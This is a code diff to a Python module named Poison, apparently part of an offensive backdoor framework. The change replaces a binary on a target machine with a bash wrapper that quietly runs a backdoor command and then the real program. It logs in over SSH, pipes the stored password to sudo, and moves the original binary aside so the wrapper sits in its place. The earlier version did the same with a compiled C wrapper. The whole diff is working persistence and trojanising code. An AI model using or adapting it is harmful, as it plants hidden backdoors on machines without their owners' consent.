@@ -17,12 +17,12 @@ class Poison(Module):
         loc = self.get_value("location")
         password = self.target.pword
         
-        poison = open("tmp/poison.c", "w")
-        poison.write("#include <stdlib.h>\nint main() {\nsystem(\"%s\");\nsystem(\"%s/share/%s\");\nreturn 0;\n }" % (self.backdoor.get_command(), loc, name))
+        poison = open("tmp/%s" % name, "w")
+        poison.write("#!/bin/bash\n( %s & ) > /dev/null 2>&1 && %s/share/%s $@" % (self.backdoor.get_command(), loc, name))
         poison.close()
-        os.system("gcc tmp/poison.c -o tmp/%s" % name)
         self.target.scpFiles(self, "tmp/" + name, False)
-        self.target.ssh.exec_command("echo %s | sudo -S mkdir %s/share" % (password, loc)) # sudo fix
-        self.target.ssh.exec_command("echo %s | sudo -S mv %s/%s %s/share/" % (password, loc, name, loc))
-        self.target.ssh.exec_command("echo %s | sudo -S mv %s %s/" % (password, name, loc))
+        self.target.ssh.exec_command("echo %s | sudo -S mkdir %s/share" % (password, loc)) # create folder
+        self.target.ssh.exec_command("echo %s | sudo -S mv %s/%s %s/share/" % (password, loc, name, loc)) #move old binary to folder
+        self.target.ssh.exec_command("echo %s | sudo -S cp %s %s/" % (password, name, loc)) #move new binary to old location
+        self.target.ssh.exec_command("echo %s | sudo -S chmod +x %s/%s" % (password, loc, name))
         print(GOOD + self.name + " module success")
